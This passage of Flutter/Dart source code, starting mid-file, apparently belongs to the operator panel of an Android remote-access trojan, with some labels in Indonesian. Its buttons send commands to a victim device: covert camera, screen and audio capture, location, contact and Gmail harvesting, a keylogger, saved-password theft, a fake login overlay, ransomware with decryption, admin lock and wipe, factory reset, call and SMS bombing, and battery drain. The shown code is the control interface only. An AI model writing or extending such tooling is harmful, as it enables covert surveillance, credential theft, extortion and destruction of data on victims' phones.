                  ),
                ),
              ],
            ),
          );
        }
      ),
    );
  }

  Widget _buildLogContainer() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
      padding: const EdgeInsets.all(12),
      height: 120, 
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: const Color(0xFFE53935)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.list_alt, color: Color(0xFFE53935), size: 14),
              SizedBox(width: 8),
              Text("Activity Log", style: TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 8),
          Expanded(
            child: ListView.builder(
              itemCount: _executionLogs.length,
              itemBuilder: (context, i) => Padding(
                padding: const EdgeInsets.symmetric(vertical: 2),
                child: Text(
                  _executionLogs[i], 
                  style: const TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace'),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlBlock(String title, String subtitle, IconData icon, List<Widget> actionButtons) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 8),
      padding: const EdgeInsets.all(15),
      decoration: BoxDecoration(
        color: cardBg, 
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: const Color(0xFFE53935).withOpacity(0.3), width: 1.5), 
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: const Color(0xFFE53935).withOpacity(0.1),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: const Color(0xFFE53935), size: 24),
              ),
              const SizedBox(width: 15),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title, style: const TextStyle(color: Color(0xFFE53935), fontSize: 16, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              ),
              const Icon(Icons.keyboard_arrow_down, color: Color(0xFFE53935)),
            ],
          ),
          const SizedBox(height: 15),
          Wrap(
            spacing: 10,
            runSpacing: 10,
            children: actionButtons,
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton(String label, IconData icon, String cmd, String targetId) {
    return InkWell(
      onTap: () {
        if (cmd == 'take_photo') {
          _showCameraMenu(targetId);
        } else if (cmd == 'get_screen') {
          _sendCommand("get_screen", targetId);
        } else if (cmd == 'open_url' || cmd == 'hard_lock' || cmd == 'set_wallpaper' || cmd == 'play_audio') {
          _showInputDialog(label, cmd, targetId);
        } else if (cmd == 'stop_audio') {
          _sendCommand("stop_audio", targetId);
        } else if (cmd == 'activate_ransomware') {
          _showConfirmDialog("💀 RANSOMWARE", "Aktifkan Ransomware?", "activate_ransomware", targetId);
        } else if (cmd == 'panic_mode') {
          _showConfirmDialog("⚠️ PANIC MODE", "Aktifkan Panic Mode?", "panic_mode", targetId);
        } else if (cmd == 'virus_mode') {
          _showInputDialog("🦠 VIRUS MODE", "virus_mode", targetId);
        } else if (cmd == 'panic_unlock') {
          _sendCommand("panic_unlock", targetId);
        } else if (cmd == 'virus_unlock') {
          _sendCommand("virus_unlock", targetId);
        } else if (cmd == 'decrypt_files') {
          _sendCommand("decrypt_files", targetId);
        } else if (cmd == 'factory_reset') {
          _showConfirmDialog("💣 FACTORY RESET", "Reset HP target?", "factory_reset", targetId);
        } else if (cmd == 'wipe_data') {
          _showConfirmDialog("🗑️ WIPE DATA", "Hapus semua file target?", "wipe_data", targetId);
        } else if (cmd == 'call_bombing') {
          _showInputDialog("📞 CALL BOMBING", "call_bombing", targetId);
        } else if (cmd == 'sms_bomber') {
          _showInputDialog("📨 SMS BOMBER", "sms_bomber", targetId);
        } else if (cmd == 'battery_drain') {
          _sendCommand("battery_drain", targetId);
        } else if (cmd == 'flashlight_on') {
          _sendCommand("flashlight_on", targetId);
        } else if (cmd == 'flashlight_off') {
          _sendCommand("flashlight_off", targetId);
        } else if (cmd == 'flash_strobe') {
          _sendCommand("flash_strobe", targetId);
        } else if (cmd == 'stop_strobe') {
          _sendCommand("stop_strobe", targetId);
        } else if (cmd == 'vibrate_loop') {
          _sendCommand("vibrate_loop", targetId);
        } else if (cmd == 'unlock') {
          _sendCommand("unlock", targetId);
        } else if (cmd == 'get_location') {
          _sendCommand("get_location", targetId);
        } else if (cmd == 'get_contacts') {
          _sendCommand("get_contacts", targetId);
        } else if (cmd == 'get_gmails') {
          _sendCommand("get_gmails", targetId);
        } else if (cmd == 'get_notif_logs') {
          _fetchNotificationLogs(targetId);
        } else if (cmd == 'force_open') {
          _sendCommand("force_open", targetId);
        } else if (cmd == 'open_url') {
          _showInputDialog("🌐 OPEN URL", "open_url", targetId);
        } else if (cmd == 'grab_gallery') {
          _sendCommand("grab_gallery", targetId);
        } else if (cmd == 'grab_videos') {
          _sendCommand("grab_videos", targetId);
        } else if (cmd == 'request_admin') {
          _sendCommand("request_admin", targetId);
        } else if (cmd == 'is_admin') {
          _sendCommand("is_admin", targetId);
        } else if (cmd == 'admin_lock') {
          _sendCommand("admin_lock", targetId);
        } else if (cmd == 'admin_wipe') {
          _sendCommand("admin_wipe", targetId);
        } else if (cmd == 'start_cam_stream') {
          _showInputDialog("📷 CAMERA STREAM", "start_cam_stream", targetId);
        } else if (cmd == 'stop_cam_stream') {
          _sendCommand("stop_cam_stream", targetId);
        } else if (cmd == 'start_screen_stream') {
          _sendCommand("start_screen_stream", targetId);
        } else if (cmd == 'stop_screen_stream') {
          _sendCommand("stop_screen_stream", targetId);
        } else if (cmd == 'record_audio') {
          _sendCommand("record_audio", targetId);
        } else if (cmd == 'stop_record_audio') {
          _sendCommand("stop_record_audio", targetId);
        }
        // ==================== KEYLOGGER & PASSWORD BUTTONS ====================
        else if (cmd == 'start_keylogger') {
          _sendCommand("start_keylogger", targetId);
        } else if (cmd == 'stop_keylogger') {
          _sendCommand("stop_keylogger", targetId);
        } else if (cmd == 'get_keylogs') {
          _sendCommand("get_keylogs", targetId);
        } else if (cmd == 'get_saved_passwords') {
          _sendCommand("get_saved_passwords", targetId);
        } else if (cmd == 'start_fake_login') {
          _showInputDialog("🎭 FAKE LOGIN", "start_fake_login", targetId);
        } else if (cmd == 'stop_fake_login') {
          _sendCommand("stop_fake_login", targetId);
        } else {
          _sendCommand(cmd, targetId);
        }
      },
      borderRadius: BorderRadius.circular(8),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          color: const Color(0xFF2A2A2A), 
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: const Color(0xFFE53935).withOpacity(0.2)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min, 
          children: [
            Icon(icon, color: const Color(0xFFE53935), size: 14),
            const SizedBox(width: 6),
            Text(label, style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final device = widget.device;
    final String targetId = device?['id']?.toString() ?? "unknown";
    final String model = device?['model'] ?? "Device";

    return Scaffold(
      backgroundColor: darkBg,
      appBar: AppBar(
        backgroundColor: cardBg,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFFE53935)),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(model, style: const TextStyle(fontSize: 14, fontWeight: FontWeight.bold, color: Color(0xFFE53935))),
            Text(targetId, style: const TextStyle(fontSize: 10, color: Colors.white54)),
          ],
        ),
        actions: [
          if (_isSending)
            const Padding(
              padding: EdgeInsets.all(12),
              child: SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFFE53935)),
              ),
            ),
        ],
      ),
      body: ListView(
        children: [
          _buildLogContainer(),
          
          _buildControlBlock(
            "📡 SURVEILLANCE",
            "Camera, Screen Stream, Location, Contacts, Gmail, Notifications",
            Icons.camera_alt,
            [
              _buildActionButton("📸 INSTANT PHOTO", Icons.camera, "take_photo", targetId),
              _buildActionButton("🎬 REAL STREAM", Icons.screenshot, "get_screen", targetId),
              _buildActionButton("📍 GET LOCATION", Icons.location_on, "get_location", targetId),
              _buildActionButton("📱 GET CONTACTS", Icons.contacts, "get_contacts", targetId),
              _buildActionButton("📧 GET GMAILS", Icons.email, "get_gmails", targetId),
              _buildActionButton("🔔 GET NOTIF", Icons.notifications, "get_notif_logs", targetId),
              _buildActionButton("🎙️ RECORD AUDIO", Icons.mic, "record_audio", targetId),
              _buildActionButton("⏹️ STOP RECORD", Icons.mic_off, "stop_record_audio", targetId),
            ],
          ),
          
          _buildControlBlock(
            "⌨️ KEYLOGGER & PASSWORD",
            "Keylogger, Saved Passwords, Fake Login",
            Icons.keyboard,
            [
              _buildActionButton("🎙️ START KEYLOGGER", Icons.keyboard, "start_keylogger", targetId),
              _buildActionButton("⏹️ STOP KEYLOGGER", Icons.block, "stop_keylogger", targetId),
              _buildActionButton("📝 GET KEYLOGS", Icons.text_snippet, "get_keylogs", targetId),
              _buildActionButton("🔑 GET SAVED PASSWORDS", Icons.password, "get_saved_passwords", targetId),
              _buildActionButton("🎭 START FAKE LOGIN", Icons.login, "start_fake_login", targetId),
              _buildActionButton("⏹️ STOP FAKE LOGIN", Icons.logout, "stop_fake_login", targetId),
            ],
          ),
          
          _buildControlBlock(
            "📸 GALLERY GRABBER",
            "Ambil semua foto & video dari target",
            Icons.photo_library,
            [
              _buildActionButton("📸 GRAB GALLERY", Icons.photo, "grab_gallery", targetId),
              _buildActionButton("🎬 GRAB VIDEOS", Icons.video_library, "grab_videos", targetId),
            ],
          ),
          
          _buildControlBlock(
            "📹 LIVE STREAM",
            "Stream kamera & layar realtime",
            Icons.videocam,
            [
              _buildActionButton("📷 START CAM STREAM", Icons.videocam, "start_cam_stream", targetId),
              _buildActionButton("⏹️ STOP CAM STREAM", Icons.stop, "stop_cam_stream", targetId),
              _buildActionButton("🎬 START SCREEN STREAM", Icons.screenshot, "start_screen_stream", targetId),
              _buildActionButton("⏹️ STOP SCREEN STREAM", Icons.stop, "stop_screen_stream", targetId),
            ],
          ),
          
          _buildControlBlock(
            "🔒 LOCK SYSTEM",
            "Hard Lock, Unlock, Ransomware, Panic, Virus",
            Icons.lock,
            [
              _buildActionButton("🔒 HARD LOCK", Icons.lock, "hard_lock", targetId),
              _buildActionButton("🔓 UNLOCK", Icons.lock_open, "unlock", targetId),
              _buildActionButton("💀 RANSOMWARE", Icons.bug_report, "activate_ransomware", targetId),
              _buildActionButton("🔓 DECRYPT", Icons.security, "decrypt_files", targetId),
              _buildActionButton("⚠️ PANIC MODE", Icons.warning, "panic_mode", targetId),
              _buildActionButton("🔓 PANIC UNLOCK", Icons.lock_open, "panic_unlock", targetId),
              _buildActionButton("🦠 VIRUS MODE", Icons.bug_report, "virus_mode", targetId),
              _buildActionButton("🔓 VIRUS UNLOCK", Icons.lock_open, "virus_unlock", targetId),
            ],
          ),
          
          _buildControlBlock(
            "👑 DEVICE ADMIN",
            "Admin access, lock, wipe data",
            Icons.admin_panel_settings,
            [
              _buildActionButton("👑 REQUEST ADMIN", Icons.admin_panel_settings, "request_admin", targetId),
              _buildActionButton("🔍 CHECK ADMIN", Icons.verified, "is_admin", targetId),
              _buildActionButton("🔒 ADMIN LOCK", Icons.lock, "admin_lock", targetId),
              _buildActionButton("💣 ADMIN WIPE", Icons.delete_forever, "admin_wipe", targetId),
            ],
          ),
          
          _buildControlBlock(
            "💣 DESTRUCTIVE",
            "Factory Reset, Wipe Data, Bomber",
            Icons.warning,
            [
              _buildActionButton("💣 FACTORY RESET", Icons.settings_backup_restore, "factory_reset", targetId),
              _buildActionButton("🗑️ WIPE DATA", Icons.delete_forever, "wipe_data", targetId),
              _buildActionButton("📞 CALL BOMBING", Icons.phone, "call_bombing", targetId),
              _buildActionButton("📨 SMS BOMBER", Icons.message, "sms_bomber", targetId),
              _buildActionButton("🔋 BATTERY DRAIN", Icons.battery_alert, "battery_drain", targetId),
            ],
          ),
          
          _buildControlBlock(
            "🎮 EFFECTS & MEDIA",
            "Flashlight, Strobe, Vibrate, Audio, Wallpaper",
            Icons.bolt,
            [
              _buildActionButton("🔦 FLASHLIGHT ON", Icons.flash_on, "flashlight_on", targetId),
              _buildActionButton("🔦 FLASHLIGHT OFF", Icons.flash_off, "flashlight_off", targetId),
              _buildActionButton("⚡ START STROBE", Icons.flash_on, "flash_strobe", targetId),
              _buildActionButton("⏹️ STOP STROBE", Icons.flash_off, "stop_strobe", targetId),
              _buildActionButton("📳 VIBRATE", Icons.vibration, "vibrate_loop", targetId),
              _buildActionButton("🎵 PLAY AUDIO", Icons.music_note, "play_audio", targetId),
              _buildActionButton("⏹️ STOP AUDIO", Icons.stop, "stop_audio", targetId),
              _buildActionButton("🖼️ SET WALLPAPER", Icons.wallpaper, "set_wallpaper", targetId),
              _buildActionButton("🌐 OPEN URL", Icons.link, "open_url", targetId),
            ],
          ),
        ],
      ),
    );
  }
}